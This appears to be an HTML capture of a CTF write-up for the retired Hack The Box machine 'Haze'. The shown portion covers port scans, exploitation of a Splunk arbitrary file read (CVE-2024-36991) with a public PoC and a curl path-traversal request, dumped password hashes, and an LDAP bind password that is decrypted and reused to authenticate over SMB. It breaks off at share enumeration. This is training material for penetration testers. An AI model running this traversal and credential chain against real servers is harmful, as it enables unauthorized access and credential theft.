@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Haze | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (8000), CVE-2024-36991." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Haze" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (8000), CVE-2024-36991." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/og.png?v=bb37b8b4" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Haze" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (8000), CVE-2024-36991." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/og.png?v=bb37b8b4" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Haze","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (8000), CVE-2024-36991.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/","datePublished":"2026-06-07","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Haze","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-haze/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Haze</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-06-07 · 21 min read</p><h1>Haze</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (8000), CVE-2024-36991.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Haze" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-haze.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-haze.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Haze</h2><p>Haze is a hard difficulty Windows machine focused on web exploitation, domain abuse, and Windows privilege escalation. Initial access is gained by exploiting a Splunk Arbitrary File Read (CVE-2024-36991) to extract an LDAP bind password, which is then decrypted using…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>29 Mar 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>EmSec</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>2,366</dd></div><div><dt>Root owns</dt><dd>2,197</dd></div><div><dt>User blood</dt><dd>Mojo098<small class="room-blood-time">2H 2M 8S</small></dd></div><div><dt>Root blood</dt><dd>zer0dave<small class="room-blood-time">2H 47M 1S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2743 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>49 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>30 votes</title></rect><rect x="52" y="53" width="20" height="11" rx="2" fill="hsl(80 70% 55%)"><title>139 votes</title></rect><rect x="78" y="47" width="20" height="17" rx="2" fill="hsl(70 70% 55%)"><title>224 votes</title></rect><rect x="104" y="34" width="20" height="30" rx="2" fill="hsl(50 70% 55%)"><title>385 votes</title></rect><rect x="130" y="29" width="20" height="35" rx="2" fill="hsl(38 70% 55%)"><title>448 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>822 votes</title></rect><rect x="182" y="33" width="20" height="31" rx="2" fill="hsl(16 70% 55%)"><title>403 votes</title></rect><rect x="208" y="53" width="20" height="11" rx="2" fill="hsl(8 70% 55%)"><title>145 votes</title></rect><rect x="234" y="56" width="20" height="8" rx="2" fill="hsl(0 70% 55%)"><title>98 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.1, Real-Life 7.4, CVE 6.6, Custom Exploitation 3.4, CTF-Like 2.6"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,53.3 159.3,94.0 137.2,147.4 96.0,129.3 92.7,104.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Haze" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.11.223 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT dc01.haze.htb                                                                                                                                   
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 16:31 +0100
+Nmap scan report for dc01.haze.htb (10.129.11.223)
+Host is up (0.013s latency).
+rDNS record for 10.129.11.223: DC01.haze.htb
+Not shown: 65505 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+8000/tcp  open  http-alt
+8088/tcp  open  radan-http
+8089/tcp  open  unknown
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49674/tcp open  unknown
+49683/tcp open  unknown
+49684/tcp open  unknown
+64858/tcp open  unknown
+64865/tcp open  unknown
+64868/tcp open  unknown
+64883/tcp open  unknown
+64918/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 -A --min-rate=2000 -sT dc01.haze.htb                                                            
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 16:33 +0100
+Nmap scan report for dc01.haze.htb (10.129.11.223)
+Host is up (0.013s latency).
+rDNS record for 10.129.11.223: DC01.haze.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-07 23:33:45Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
+| Not valid before: 2026-06-07T23:20:32
+|_Not valid after:  2027-06-07T23:20:32
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
+| Not valid before: 2026-06-07T23:20:32
+|_Not valid after:  2027-06-07T23:20:32
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
+| Not valid before: 2026-06-07T23:20:32
+|_Not valid after:  2027-06-07T23:20:32
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.haze.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.haze.htb
+| Not valid before: 2026-06-07T23:20:32
+|_Not valid after:  2027-06-07T23:20:32
+|_ssl-date: TLS randomness does not represent time
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8000/tcp open  http          Splunkd httpd
+|_http-server-header: Splunkd
+| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+|_Requested resource was http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F
+| http-robots.txt: 1 disallowed entry 
+|_/
+8088/tcp open  ssl/http      Splunkd httpd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2025-03-05T07:29:08
+|_Not valid after:  2028-03-04T07:29:08
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Splunkd
+|_http-title: 404 Not Found
+8089/tcp open  ssl/http      Splunkd httpd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2025-03-05T07:29:08
+|_Not valid after:  2028-03-04T07:29:08
+|_http-title: splunkd
+|_http-server-header: Splunkd
+|_ssl-date: TLS randomness does not represent time
+| http-robots.txt: 1 disallowed entry 
+|_/
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (96%), Microsoft Windows Server 2016 (96%), Microsoft Windows 11 24H2 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows 11 24H2 - 25H2 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth is enabled but i cannot use it to list shares or dump users</p><p>Guest account is disabled</p><h2>HTTP (8000)</h2><h3>Nuclei</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://haze.htb:8000/       
+
+[CVE-2024-36991] [http] [high] http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Windows/win.ini
+[INF] Skipped haze.htb:9780 from target list as found unresponsive permanently: cause=&quot;port closed or filtered&quot; address=haze.htb:9780 chain=&quot;connection refused; got err while executing http://haze.htb:9780/api/v1/user_assets/nfc&quot;
+[ldap-metadata] [javascript] [info] haze.htb:8000 [&quot;DomainControllerFunctionality: 7&quot;,&quot;BaseDN: dc=8000&quot;,&quot;DnsHostName: dc01.haze.htb&quot;,&quot;DefaultNamingContext: DC=haze,DC=htb&quot;,&quot;DomainFunctionality: 7&quot;,&quot;ForestFunctionality: 7&quot;]
+[splunk-enterprise-panel] [http] [info] http://haze.htb:8000/en-US/account/login
+[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/en-GB/
+[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/
+[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/
+[robots-txt-endpoint] [http] [info] http://haze.htb:8000/robots.txt
+[robots-txt] [http] [info] http://haze.htb:8000/robots.txt
+[missing-cookie-samesite-strict] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F [&quot;cval=1064979552; Path=/en-GB/account/ splunkweb_uid=D49EBB76-3DE2-417C-9AA2-38EE230638CB; Path=/en-GB/account; Max-Age=157680000; Expires=Fri, 06 Jun 2031 23:44:30 GMT&quot;]
+[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
+[missing-cookie-samesite-strict] [http] [info] http://haze.htb:8000/en-GB/ [&quot;session_id_8000=291dda4b4ddb6c2dc26ea8c71ecd2bdd833b8633; expires=Mon, 08 Jun 2026 00:44:30 GMT; HttpOnly; Max-Age=3600; Path=/&quot;]
+[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/en-GB/
+[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/en-GB/
+[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/
+[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/
+[caa-fingerprint] [dns] [info] haze.htb</code></pre><p>CVE-2024-36991?</p><h2>CVE-2024-36991</h2><p><a href="https://github.com/bigb0x/CVE-2024-36991/blob/main/CVE-2024-36991.py" target="_blank" rel="noreferrer">https://github.com/bigb0x/CVE-2024-36991/blob/main/CVE-2024-36991.py</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 CVE-2024-36991.py -u http://haze.htb:8000/     
+/home/kali/htb/haze/CVE-2024-36991/CVE-2024-36991.py:55: SyntaxWarning: invalid escape sequence &#39;\ &#39;
+  LOG_DIR = &#39;logs&#39;
+
+                                                                        
+  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
+ / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
+| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| &#39;_ | (_) | (_) | |
+| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
+ \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
+                                                                           
+-&gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
+-&gt; By x.com/MohamedNab1l
+-&gt; Use Wisely.
+
+[INFO] Log directory created: logs
+[INFO] Testing single target: http://haze.htb:8000/
+[VLUN] Vulnerable: http://haze.htb:8000/
+:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
+:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
+:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
+:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152</code></pre><p>This looks like its dumped hashes for four users!</p><p>Of course these are hashes and to crack these ill have to get the <code>splunk.secret</code></p><p>After doing some research i find the path is <code>C:\Program Files\Splunk\etc\auth\splunk.secret</code></p><p><img src="images/haze/pasted-image-20260607170045.webp" alt="Screenshot" loading="lazy" /></p><p>I found the secret</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD</code></pre><p>After some research i find i can use a tool called splunksecrets for password decryption.</p><p><a href="https://github.com/HurricaneLabs/splunksecrets" target="_blank" rel="noreferrer">https://github.com/HurricaneLabs/splunksecrets</a></p><p>For some reason i cannot get these to decrypt, the only possible explanation is these are not the right ciphertexts for this secret</p><p>Ill do some more research on other possible ciphertexts stored in the splunk config</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl &#39;http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf&#39; --path-as-is 
+[splunk_auth]
+minPasswordLength = 8
+minPasswordUppercase = 0
+minPasswordLowercase = 0
+minPasswordSpecial = 0
+minPasswordDigit = 0
+
+[Haze LDAP Auth]
+SSLEnabled = 0
+anonymous_referrals = 1
+bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
+bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
+charset = utf8
+emailAttribute = mail
+enableRangeRetrieval = 0
+groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
+groupMappingAttribute = dn
+groupMemberAttribute = member
+groupNameAttribute = cn
+host = dc01.haze.htb
+nestedGroups = 0
+network_timeout = 20
+pagelimit = -1
+port = 389
+realNameAttribute = cn
+sizelimit = 1000
+timelimit = 15
+userBaseDN = CN=Users,DC=haze,DC=htb
+userNameAttribute = samaccountname
+
+[authentication]
+authSettings = Haze LDAP Auth
+authType = LDAP</code></pre><p>Now i have found another hash, for a user paul taylor</p><p><img src="images/haze/pasted-image-20260607172227.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Ld@p_Auth_Sp1unk@2k24</code></pre><p>Since this was for the user paul taylor, ill try some possible combinations for paul, before trying something like username anarchy.</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.haze.htb -u &#39;paul.taylor&#39; -p &#39;Ld@p_Auth_Sp1unk@2k24&#39;
+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24</code></pre><p>This user is now compromised</p><h2>Access as <code>paul.taylor</code></h2><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.haze.htb -u paul.taylor -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --shares
